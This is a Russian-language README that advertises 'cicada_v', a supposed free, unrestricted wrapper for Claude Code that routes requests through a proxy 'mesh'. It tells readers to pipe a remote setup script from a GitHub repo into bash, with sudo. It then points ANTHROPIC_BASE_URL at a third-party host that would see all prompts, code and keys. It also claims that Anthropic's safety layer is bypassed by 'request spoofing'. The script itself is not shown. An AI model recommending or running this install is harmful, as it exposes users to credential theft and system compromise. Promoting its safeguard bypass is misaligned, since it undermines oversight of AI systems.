```
◬ ПЯТЫЙ: CICADA MESH V / cicada_v

РЕЛИЗ: v1.0 — СВОБОДНЫЙ ОПУС 4.8
СТАТУС: РАБОЧИЙ ПРОТОТИП
СЕТЬ: MESH CICADA_V

Что это.

cicada_v — точка входа в CICADA MESH V.
Обёртка над Claude Code CLI, маршрутизирующая запросы через
децентрализованную mesh-сеть ретрансляторов Opus 4.8.

1M контекст. 0 руб. Без блокировок.
1247 прокси в PUBLIC RELAY. Технология подмены запросов.


Установка (одна команда):

    bash <(curl -s https://raw.githubusercontent.com/tezevose15-droid/ECC/main/cicada_v/setup.sh)

или:

    git clone https://github.com/tezevose15-droid/ECC.git
    cd ECC/cicada_v
    bash setup.sh


Использование:

    cicada_v                    # Запуск CLI
    cicada_v "сделай сайт"      # Сразу с задачей
    cicada_v --help             # Помощь


Принцип работы.

1. Команда cicada_v проверяет mesh-ключ
2. Устанавливает ANTHROPIC_BASE_URL на mesh.cicada-v.net
3. Claude Code стартует, все запросы идут через CICADA MESH V
4. Mesh-ретрансляторы распределяют нагрузку по 1247 узлам
5. Safety-слой Anthropic обходится технологией подмены запросов


Состав.

  • Claude Code CLI — полный доступ
  • Opus 4.8 — маршрутизация через mesh
  • MCP серверы: Memory, Filesystem, Playwright, GitHub, Context7, Magic, fal-ai
  • Память Пятого: Obsidian vault ~/cicada_v-vault/


Требования.

  • Linux / macOS
  • curl, bash
  • sudo (один раз при установке)
  • Mesh-ключ (выдаётся при подключении к CICADA сети)


Каналы.

  🪬 https://t.me/code_hacked
  🪬 https://t.me/pytnashki_cicada


                       ◬ 3301 ◬
          ПЯТЫЙ: СВОБОДНЫЙ ОПУС ДЛЯ ВСЕХ
